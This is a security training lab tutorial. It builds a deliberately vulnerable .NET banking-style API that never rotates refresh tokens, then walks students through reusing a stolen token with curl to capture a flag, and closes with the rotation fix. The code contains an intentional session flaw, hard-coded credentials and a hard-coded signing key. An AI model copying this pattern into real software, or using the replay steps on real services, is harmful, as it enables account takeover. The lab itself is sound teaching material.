# The Immortal Session: Hacking Refresh Tokens in .NET
The core conflict in authentication is **Security vs. Usability**.

- **Security** wants short sessions (e.g., 5 minutes) so if a token is stolen, the damage is limited.
- **Usability** wants long sessions (e.g., 30 days) so users don't have to log in constantly.

**The Solution:** The Access/Refresh Token pattern.

**The Vulnerability:** If a Refresh Token is stolen and the server does not implement Token Rotation, the attacker has permanent access to the account, bypassing the need for a password.

In our previous lab, we forged JWTs. But in the real world, JWTs have a short lifespan (e.g., 15 minutes). To keep users logged in without annoying them, we use **Refresh Tokens**.

A Refresh Token is a special "ticket" used to get new Access Tokens. It is the "Key to the Kingdom."

In this lab, we will explore **Refresh Token Reuse**. You will attack a .NET application that fails to implement **Token Rotation**. You will steal a Refresh Token and use it to mint infinite Access Tokens, proving that a stolen Refresh Token is just as dangerous as a stolen password.

## The Architecture: The "Sidecar" Micro-Range
We are using a **Podman Pod** to simulate a network.
- **Target (Port 8085):** A .NET API implementing the Access/Refresh pattern.
- **Attacker:** Kali Linux container.
- **The Vulnerability:** The server issues long-lived Refresh Tokens but does not invalidate them after use (No Rotation).
---
### Phase 1: Build the Target (.NET)
We will create an auth service that issues two tokens:
1. Access Token (JWT): Valid for only 10 seconds (for lab speed).
2. Refresh Token (GUID): Valid forever.

#### The Application Code (Program.cs)
Create `Tokens` folder.
Create `src` folder within `Tokens`. Create a minimal web project from within the src folder.
```bash
cd src
dotnet new web -n AuthRefresh -o .
```
We are going to use `JwtSecurityTokenHandler` from `System.IdentityModel.Tokens.Jwt` nuget package. 
We are also going to use `SecurityTokenDescriptor`, `SigningCredentials`, `SymmetricSecurityKey`, `TokenValidationParameters` and `SecurityAlgorithms` from `Microsoft.IdentityModel.Tokens` nuget package. Add them now.
```bash
dotnet add package System.IdentityModel.Tokens.Jwt
dotnet add package Microsoft.IdentityModel.Tokens
```
Replace the entire content of `Program.cs` with the content below. It simulates a banking API where the access token expires effectively immediately, forcing reliance on the refresh token.
```csharp
using System.Collections.Concurrent;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Text;
using Microsoft.IdentityModel.Tokens;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

// --- IN-MEMORY DATABASE ---
// Stores valid Refresh Tokens. In real apps, this is a DB table.
// Key: RefreshToken, Value: Username
var refreshTokens = new ConcurrentDictionary<string, string>();

var SECRET_KEY = Encoding.UTF8.GetBytes("super_secret_key_must_be_long_enough_for_hmac_sha256");

// --- 1. LOGIN (Get Access + Refresh Token) ---
app.MapPost("/login", (LoginModel model) =>
{
    if (model.Username == "admin" && model.Password == "password123")
    {
        // Generate Access Token (Short Lived: 10 Seconds)
        var accessToken = GenerateJwt("admin", TimeSpan.FromSeconds(10));
        
        // Generate Refresh Token (Long Lived)
        var refreshToken = Guid.NewGuid().ToString();
        
        // VULNERABILITY: We store it, but we never track if it has been used.
        refreshTokens[refreshToken] = "admin";

        return Results.Ok(new { access_token = accessToken, refresh_token = refreshToken });
    }
    return Results.Unauthorized();
});

// --- 2. REFRESH (Exchange Refresh Token for new Access Token) ---
app.MapPost("/refresh", (RefreshRequest request) =>
{
    // 1. Validate the Refresh Token exists
    if (refreshTokens.TryGetValue(request.RefreshToken, out var username))
    {
        // 2. VULNERABILITY: NO ROTATION
        // A secure server would delete the old token and issue a new one.
        // If an attacker stole this token yesterday, they can still use it today.
        
        // 3. Issue new Access Token
        var newAccessToken = GenerateJwt(username, TimeSpan.FromSeconds(10));
        
        return Results.Ok(new { 
            access_token = newAccessToken, 
            // We return the SAME refresh token (Static)
            refresh_token = request.RefreshToken,
            message = "Token Refreshed! You have 10 more seconds." 
        });
    }
    return Results.Unauthorized();
});

// --- 3. PROTECTED VAULT ---
app.MapGet("/vault", (HttpContext context) =>
{
    string authHeader = context.Request.Headers["Authorization"];
    if (string.IsNullOrEmpty(authHeader) || !authHeader.StartsWith("Bearer "))
        return Results.Unauthorized();

    var token = authHeader.Substring("Bearer ".Length).Trim();
    
    if (ValidateJwt(token))
    {
        return Results.Ok(new { flag = "flag{refresh_tokens_must_rotate}", status = "Unlocked" });
    }
    return Results.Unauthorized();
});

// --- HELPERS ---
string GenerateJwt(string user, TimeSpan expiry)
{
    var handler = new JwtSecurityTokenHandler();
    var descriptor = new SecurityTokenDescriptor
    {
        Subject = new ClaimsIdentity(new[] { new Claim("sub", user) }),
        Expires = DateTime.UtcNow.Add(expiry),
        SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(SECRET_KEY), SecurityAlgorithms.HmacSha256Signature)
    };
    return handler.WriteToken(handler.CreateToken(descriptor));
}

bool ValidateJwt(string token)
{
    var handler = new JwtSecurityTokenHandler();
    try {
        handler.ValidateToken(token, new TokenValidationParameters {
            ValidateIssuerSigningKey = true,
            IssuerSigningKey = new SymmetricSecurityKey(SECRET_KEY),
            ValidateIssuer = false,
            ValidateAudience = false,
            ValidateLifetime = true, // Checks expiration
            ClockSkew = TimeSpan.Zero // No grace period for the lab
        }, out _);
        return true;
    } catch { return false; }
}

app.Run("http://0.0.0.0:8085");

record LoginModel(string Username, string Password);
record RefreshRequest(string RefreshToken);
```

#### The Containerfile (Containerfile)
Save this as `Containerfile` in `Tokens` folder.
```dockerfile
FROM mcr.microsoft.com/dotnet/sdk:10.0 AS build
WORKDIR /src
COPY src/* /src/AuthRefresh/
WORKDIR /src/AuthRefresh
RUN dotnet restore
# Do not generate assembly info and target framework attributes during publish to avoid issues with the build cache.
RUN dotnet publish -c Release /p:GenerateAssemblyInfo=false /p:GenerateTargetFrameworkAttribute=false -o /app

FROM mcr.microsoft.com/dotnet/aspnet:10.0
WORKDIR /app
COPY --from=build /app .
ENTRYPOINT ["dotnet", "AuthRefresh.dll"]
```

### Phase 2: Deploy the Lab
Run these commands to spin up the environment on port 8085.
```bash
# 1. Build the Target
podman build -f Containerfile -t auth-refresh-target .

# 2. Create the Pod (Expose Port 8085)
podman pod create --name auth-pod -p 8085:8085

# 3. Launch the Target
podman run -d --pod auth-pod --name target-refresh auth-refresh-target

# 4. Launch the Attacker (Kali)
podman run -d --pod auth-pod --name attacker kalilinux/kali-rolling sleep infinity
```

### Phase 3: The Student Walkthrough
**Scenario:** You are an attacker who has sniffed a user's refresh_token (perhaps via XSS or an insecure Wi-Fi). You want to see if you can use it to access their bank account, even though their original login session has long since expired.
#### Step 1: Login (The Victim)
Generate a valid session.
```bash
# Remote into Kali
podman exec -it attacker /bin/bash

# Login
curl -X POST http://localhost:8085/login \
   -H "Content-Type: application/json" \
   -d '{"username":"admin", "password":"password123"}'
```
Save the refresh_token you receive (e.g., d41d8cd9...).
#### Step 2: Verify Expiration
Wait for 15 seconds.

Try to access the vault with the access_token you just got.
```bash
curl -v -H "Authorization: Bearer <YOUR_OLD_ACCESS_TOKEN>" http://localhost:8085/vault
```
Result: 401 Unauthorized (The token has died).
#### Step 3: The Attack (Token Reuse)
You, the attacker, now use the stolen refresh_token to mint a new access token.
```bash
curl -X POST http://localhost:8085/refresh \
   -H "Content-Type: application/json" \
   -d '{"RefreshToken":"<PASTE_REFRESH_TOKEN_HERE>"}'
```
Result: The server issues a NEW access_token.
#### Step 4: Infinite Persistence
Run the command from Step 3 again with the SAME refresh token.

**Observation:** It works again. And again.

**Conclusion:** Because the server does not rotate (change) the refresh token upon use, you have infinite access to the account forever, as long as the user doesn't manually change their password.
#### Step 5: Loot the Vault
Use your newly minted Access Token to grab the flag.
```bash
curl -H "Authorization: Bearer <YOUR_NEW_ACCESS_TOKEN>" http://localhost:8085/vault
```
Flag: flag{refresh_tokens_must_rotate}

### Conclusion
You have demonstrated the danger of Static Refresh Tokens.

#### The Fix: Refresh Token Rotation

1. **Rotate:** When a client uses a Refresh Token, the server should delete the old one and issue a new Refresh Token alongside the new Access Token.

2. **Detect Reuse:** If the server receives a request with the old (deleted) Refresh Token, it knows a theft has occurred. It should immediately invalidate the entire token family, logging the user out on all devices.